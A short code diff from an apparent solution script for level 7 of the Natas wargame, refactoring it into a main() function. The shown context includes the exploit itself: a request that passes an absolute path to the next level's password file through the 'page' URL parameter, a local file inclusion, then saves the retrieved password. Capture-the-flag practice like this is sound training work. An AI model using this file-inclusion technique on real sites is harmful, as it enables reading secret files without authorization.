@@ -4,7 +4,7 @@ from natas_utils import *
 LEVEL = 7
 URL, LOGIN = load_level(LEVEL)
 
-if __name__ == "__main__":
+def main():
     # links on the page use URL parameters to specify pages
     # solve by passing an absolute path to password file
     response = requests.get(URL, auth=LOGIN, params={"page": flag_file_abspath(LEVEL + 1)})
@@ -16,3 +16,6 @@ if __name__ == "__main__":
         store_level_password(LEVEL + 1, natas8_password)
     else:
         exit("Failed to get password for the next level.")
+
+if __name__ == "__main__":
+    main()
